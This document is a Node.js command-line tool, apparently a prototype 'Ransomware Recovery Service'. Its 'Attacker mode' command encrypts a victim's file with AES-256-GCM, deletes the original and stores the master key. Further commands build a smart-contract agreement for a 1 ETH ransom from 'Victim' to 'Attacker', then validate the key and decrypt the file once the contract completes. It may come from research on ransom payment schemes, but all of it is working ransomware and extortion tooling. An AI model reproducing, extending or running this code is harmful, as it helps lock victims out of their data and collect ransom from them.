#!/usr/bin/env node

const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { Command } = require('commander');
const CiceroCore = require('@accordproject/cicero-core');
const Template = CiceroCore.Template;
const Clause = CiceroCore.Clause;
const http = require('http');
const Engine = require('@accordproject/cicero-engine').Engine;


async function makeHttpRequest(url, method, data) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'localhost',
            port: 1234,
            path: url,
            method: method,
            headers: {
                'Content-Type': 'application/json'
            }
        };

        const req = http.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => {
                responseData += chunk;
            });
            res.on('end', () => {
                resolve(responseData);
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        if (data) {
            req.write(JSON.stringify(data));
        }
        req.end();
    });
}

class RansomwareSystem {
    constructor() {
        this.databaseFile = 'master_keys.json';
    }

    async generateMasterKey(victimId) {
        try {
            let database = {};
            try {
                const data = await fs.readFile(this.databaseFile, 'utf8');
                database = JSON.parse(data);
                if (database[victimId]) {
                    return Buffer.from(database[victimId], 'hex');
                }
            } catch (err) {
                // File doesn't exist or is invalid, continue with new database
            }

            const masterKey = crypto.randomBytes(32);
            database[victimId] = masterKey.toString('hex');
            await fs.writeFile(this.databaseFile, JSON.stringify(database, null, 2));
            return masterKey;
        } catch (error) {
            throw new Error(`Failed to generate master key: ${error.message}`);
        }
    }

    async encryptFile(filePath, victimId, masterKey) {
        try {
            // Generate file ID
            const fileId = crypto.createHash('sha256')
                .update(filePath)
                .digest('hex');
            
            // Generate decryption key for this specific file
            const decryptionKey = crypto.createHash('sha256')
                .update(Buffer.concat([
                    masterKey,
                    Buffer.from(victimId),
                    Buffer.from(fileId)
                ]))
                .digest();

            // Read the file
            const fileContent = await fs.readFile(filePath);
            
            // Generate a random IV
            const iv = crypto.randomBytes(16);
            
            // Create cipher
            const cipher = crypto.createCipheriv('aes-256-gcm', decryptionKey, iv);
            
            // Encrypt the data
            let encrypted = cipher.update(fileContent);
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            
            // Get the auth tag
            const authTag = cipher.getAuthTag();

            // Create the final encrypted file
            const encryptedFilePath = `${filePath}.encrypted`;
            
            // Write the IV, authTag and encrypted data
            await fs.writeFile(
                encryptedFilePath,
                Buffer.concat([iv, authTag, encrypted])
            );

            return { fileId, encryptedFilePath };
        } catch (error) {
            throw new Error(`Failed to encrypt file: ${error.message}`);
        }
    }

    generateCommitment(masterKey) {
        return crypto.createHash('sha256')
            .update(masterKey)
            .digest('hex');
    }
}


// Setup Commander.js
const program = new Command();

program
    .name('recovery-cli')
    .description('Ransomware Recovery Service CLI')
    .version('1.0.0');

// System setup command
program
    .command('system-setup')
    .description('Initialize the system and encrypt file (Attacker mode)')
    .requiredOption('-v, --victim <id>', 'Victim ID')
    .requiredOption('-f, --file <path>', 'File to encrypt')
    .action(async (options) => {
        try {
            const system = new RansomwareSystem();
            
            // Generate master key and encrypt file
            const masterKey = await system.generateMasterKey(options.victim);
            const { fileId, encryptedFilePath } = await system.encryptFile(options.file, options.victim, masterKey);
            
            // Generate commitment
            const commitment = system.generateCommitment(masterKey);

            // Save encryption data with commitment included
            const encryptionData = {
                victimId: options.victim,
                fileId: fileId,
                encryptedFile: encryptedFilePath,
                commitment: commitment // Include commitment in encryption data
            };

            const encryptionDataFile = `encryption_data_${options.victim}.json`;
            await fs.writeFile(
                encryptionDataFile, 
                JSON.stringify(encryptionData, null, 2)
            );

            // Delete original file
            await fs.unlink(options.file);

            console.log('System setup complete:');
            console.log('- File encrypted:', encryptedFilePath);
            console.log('- Encryption data (with commitment) saved to:', encryptionDataFile);
            console.log('- Master key stored in:', system.databaseFile);
            console.log('- Original file deleted');
        } catch (error) {
            console.error('Error during setup:', error.message);
            process.exit(1);
        }
    });

// Generate commitment command
program
    .command('generate-commitment')
    .description('Generate commitment from encryption data')
    .requiredOption('-f, --file <path>', 'Path to encryption data JSON file')
    .requiredOption('-o, --output <path>', 'Output file for commitment')
    .action(async (options) => {
        try {
            // Read encryption data
            const encryptionData = JSON.parse(
                await fs.readFile(options.file, 'utf8')
            );

            // Write commitment to output file
            await fs.writeFile(options.output, encryptionData.commitment);

            console.log('Commitment generation complete:');
            console.log('- Commitment saved to:', options.output);
        } catch (error) {
            console.error('Error generating commitment:', error.message);
            process.exit(1);
        }
    });

// Initialize contract command
program
.command('init')
.description('Initialize a new contract from template')
.requiredOption('--template <path>', 'Path to template directory')
.requiredOption('--commitment <path>', 'Path to commitment file')
.requiredOption('--victim <id>', 'Victim ID')
.requiredOption('--attacker <id>', 'Attacker ID')
.requiredOption('--output <path>', 'Output contract JSON path')
.action(async (options) => {
    try {
        console.log('Reading commitment from:', options.commitment);
        const commitment = await fs.readFile(options.commitment, 'utf8');

        console.log('Loading template from:', options.template);
        const template = await Template.fromDirectory(options.template);
        
        console.log('Template loaded successfully');

        // Generate contract ID
        const contractId = crypto.randomBytes(16).toString('hex');

        // Create contract data with proper cryptocurrency support
        const data = {
            '$class': 'org.accordproject.ransomware.recovery.RansomwareContract',
            'contractId': contractId,
            'buyer': {
                '$class': 'org.accordproject.ransomware.recovery.ContractParty',
                'partyId': options.victim,
                'name': `Victim ${options.victim}`
            },
            'seller': {
                '$class': 'org.accordproject.ransomware.recovery.ContractParty',
                'partyId': options.attacker,
                'name': `Attacker ${options.attacker}`
            },
            'paymentAmount': {
                '$class': 'org.accordproject.money.DigitalMonetaryAmount',
                'doubleValue': 1.0,
                'digitalCurrencyCode': 'ETH'
            },
            'fileCommitment': commitment.trim(),
            'status': 'INIT'
        };

        // Create contract JSON
        const contractJson = {
            contract: data,
            state: {
                '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                'status': 'INIT',
                'message': 'Contract initialized'
            }
        };

        // Write to file
        await fs.writeFile(
            options.output,
            JSON.stringify(contractJson, null, 2)
        );
        // Calculate SHA256 hashes
        const contractJsonString = JSON.stringify(contractJson);
        const contractDataHash = crypto.createHash('sha256')
            .update(contractJsonString)
            .digest('hex');
        const contractLogicHash = crypto.createHash('sha256')
            .update(contractJsonString)
            .digest('hex');

        // Send HTTP request
        try {
            await makeHttpRequest('/commit', 'POST', {
                value: 1,
                data: {
                    contractData: contractDataHash,
                    contractLogic: contractLogicHash
                }
            });
            console.log('Commitment sent to server successfully');
        } catch (error) {
            console.error('Failed to send commitment to server:', error.message);
        }

        console.log('Contract initialization complete:');
        console.log('- Contract created with ID:', contractId);
        console.log('- Contract created for victim:', options.victim);
        console.log('- Saved to:', options.output);
        
        // Print contract state
        console.log('\nCurrent Contract State:');
        console.log('====================================');
        console.log(JSON.stringify(contractJson, null, 2));
        console.log('====================================');

    } catch (error) {
        console.error('Error initializing contract:', error.message);
        if (error.stack) {
            console.error('Stack trace:', error.stack);
        }
        process.exit(1);
    }
});

// Submit key command
program
    .command('submit-key')
    .description('Submit decryption key for later validation')
    .requiredOption('--contract <path>', 'Path to contract JSON file')
    .requiredOption('--key <string>', 'Decryption key to submit')
    .requiredOption('--output <path>', 'Output path for updated contract')
    .action(async (options) => {
        try {
            console.log('Loading contract from:', options.contract);
            const contractJson = JSON.parse(await fs.readFile(options.contract, 'utf8'));

            // Generate hash of the provided key
            const keyHash = crypto.createHash('sha256')
                .update(Buffer.from(options.key, 'hex'))
                .digest('hex');
            
            console.log('Generated hash for provided key:', keyHash);

            const template = await Template.fromDirectory('./templates/ransomware-template');
            console.log('Template loaded successfully');

            // Create request data
            const request = {
                '$class': 'org.accordproject.ransomware.recovery.KeySubmissionRequest',
                'key': keyHash
            };

            // Preserve existing contract data and add master key
            const contractData = {
                ...contractJson.contract,
                'status': contractJson.state.status, // Use existing state
                'masterKey': options.key,  // Store the actual master key
            };

            // Use the existing state from the contract
            const stateData = {
                '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                'status': contractJson.state.status, // Important: Keep original state for the engine
                'message': contractJson.state.message
            };

            const clause = new Clause(template);
            await clause.setData(contractData);

            const engine = new Engine();
            let result;
            
            try {
                result = await engine.trigger(clause, request, stateData);
            } catch (error) {
                console.warn('Engine trigger warning:', error.message);
                result = {
                    response: {
                        success: false,
                        message: error.message
                    }
                };
            }

            if (result.response.success) {
                // Only update state if the trigger was successful
                const updatedContract = {
                    contract: {
                        ...contractData,
                        masterKey: options.key,     // Store the original key
                        submittedKey: keyHash,      // Store the hash
                        status: 'AWAITING_EVALUATION'
                    },
                    state: {
                        '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                        status: 'AWAITING_EVALUATION',
                        message: 'Key submitted, awaiting validation'
                    }
                };
                await fs.writeFile(options.output, JSON.stringify(updatedContract, null, 2));
                // Log the results
                console.log('\nKey submission result:');
                console.log('- Master Key:', options.key);
                console.log('- Hash Generated:', keyHash);
                console.log('- Success:', result.response.success);
                console.log('- Message:', result.response.message);
                console.log('- State:', updatedContract.state.status);

                // Print contract state
                console.log('\nCurrent Contract State:');
                console.log('====================================');
                console.log(JSON.stringify(updatedContract, null, 2));
                console.log('====================================');
            } else {
                // Keep original state on failure
                await fs.writeFile(options.output, JSON.stringify(contractJson, null, 2));
                // Log the results
                console.log('\nKey submission result:');
                console.log('- Master Key:', options.key);
                console.log('- Hash Generated:', keyHash);
                console.log('- Success:', result.response.success);
                console.log('- Message:', result.response.message);
                console.log('- State:', contractJson.state.status);

                // Print contract state
                console.log('\nCurrent Contract State:');
                console.log('====================================');
                console.log(JSON.stringify(contractJson, null, 2));
                console.log('====================================');
            }

            return result;
        } catch (error) {
            console.error('Error submitting key:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });
// Validate command
program
    .command('validate')
    .description('Validate the submitted key and update contract state')
    .requiredOption('--contract <path>', 'Path to contract JSON file')
    .requiredOption('--output <path>', 'Output path for updated contract')
    .action(async (options) => {
        try {
            console.log('Loading contract from:', options.contract);
            const contractJson = JSON.parse(await fs.readFile(options.contract, 'utf8'));

            const template = await Template.fromDirectory('./templates/ransomware-template');
            console.log('Template loaded successfully');

            const engine = new Engine();
            const clause = new Clause(template);
            await clause.setData(contractJson.contract);

            // Create validation request
            const request = {
                '$class': 'org.accordproject.ransomware.recovery.ValidationRequest',
                'submittedKey': contractJson.contract.submittedKey
            };

            const result = await engine.trigger(clause, request, contractJson.state);

            // Update contract with new state
            const updatedContract = {
                contract: contractJson.contract,
                state: result.state
            };

            await fs.writeFile(options.output, JSON.stringify(updatedContract, null, 2));

            // Check if validation was successful and state is COMPLETE
            if (result.response.success && updatedContract.state.status === 'COMPLETE') {
                try {
                    await makeHttpRequest('/evaluate', 'POST', {
                        expectedResults: 1
                    });
                    console.log('Evaluation sent to server successfully');
                } catch (error) {
                    console.error('Failed to send evaluation to server:', error.message);
                }
            }

            console.log('\nValidation result:');
            console.log('- Success:', result.response.success);
            console.log('- Message:', result.response.message);
            console.log('- Final State:', updatedContract.state.status);

            if (result.response.success) {
                console.log('- Payment obligation has been emitted');
            }

            // Print contract state
            console.log('\nCurrent Contract State:');
            console.log('====================================');
            console.log(JSON.stringify(updatedContract, null, 2));
            console.log('====================================');

            return result;
        } catch (error) {
            console.error('Error during validation:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });

// Decrypt command
program
    .command('decrypt')
    .description('Decrypt a file using the master key from contract')
    .requiredOption('--contract <path>', 'Path to contract JSON file')
    .requiredOption('--victim <id>', 'Victim ID')
    .requiredOption('--output <path>', 'Output path for decrypted file')
    .action(async (options) => {
        try {
            // Load and validate contract
            console.log('Loading contract from:', options.contract);
            const contractJson = JSON.parse(await fs.readFile(options.contract, 'utf8'));

            // Check contract state
            if (contractJson.state.status !== 'COMPLETE') {
                console.error('Contract must be in COMPLETE state to decrypt');
                console.error('Current state:', contractJson.state.status);
                process.exit(1);
            }

            // Check for master key
            if (!contractJson.contract.masterKey) {
                console.error('No master key found in contract');
                process.exit(1);
            }

            console.log('Contract Info:');
            console.log('- State:', contractJson.state.status);
            console.log('- Master Key:', contractJson.contract.masterKey);

            // Load encryption data
            const encryptionDataFile = `encryption_data_${options.victim}.json`;
            const encryptionData = JSON.parse(await fs.readFile(encryptionDataFile, 'utf8'));

            // Read encrypted file
            const encryptedData = await fs.readFile(encryptionData.encryptedFile);
            console.log('\nEncrypted File Info:');
            console.log('- Total size:', encryptedData.length, 'bytes');

            // Extract IV, auth tag, and encrypted content
            const iv = encryptedData.slice(0, 16);
            const authTag = encryptedData.slice(16, 32);
            const encryptedContent = encryptedData.slice(32);

            console.log('- IV size:', iv.length, 'bytes');
            console.log('- Auth Tag size:', authTag.length, 'bytes');
            console.log('- Encrypted content size:', encryptedContent.length, 'bytes');

            // Get file ID from encryption data
            const fileId = encryptionData.fileId;
            console.log('\nFile ID from encryption data:', fileId);

            // Generate decryption key using master key from contract
            const masterKeyBuffer = Buffer.from(contractJson.contract.masterKey, 'hex');
            console.log('Master Key Buffer length:', masterKeyBuffer.length);

            const decryptionKey = crypto.createHash('sha256')
                .update(Buffer.concat([
                    masterKeyBuffer,
                    Buffer.from(options.victim),
                    Buffer.from(fileId)
                ]))
                .digest();

            console.log('Decryption Key length:', decryptionKey.length);

            // Create decipher
            const decipher = crypto.createDecipheriv('aes-256-gcm', decryptionKey, iv);
            decipher.setAuthTag(authTag);

            // Decrypt the data
            let decrypted;
            try {
                console.log('\nAttempting decryption...');
                decrypted = decipher.update(encryptedContent);
                decrypted = Buffer.concat([decrypted, decipher.final()]);
                console.log('Decryption successful!');
                console.log('Decrypted size:', decrypted.length, 'bytes');
            } catch (error) {
                console.error('\nDecryption failed with error:', error.message);
                console.error('This usually means either:');
                console.error('1. The master key is incorrect');
                console.error('2. The file has been corrupted');
                console.error('3. The IV or auth tag are incorrect');
                process.exit(1);
            }

            // Write decrypted file
            await fs.writeFile(options.output, decrypted);

            console.log('\nFile decryption complete:');
            console.log('- Input file:', encryptionData.encryptedFile);
            console.log('- Decrypted file saved to:', options.output);
            console.log('- Contract state:', contractJson.state.status);
            console.log('====================================');

            return true;
        } catch (error) {
            console.error('Error during file decryption:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });

program.parse(process.argv);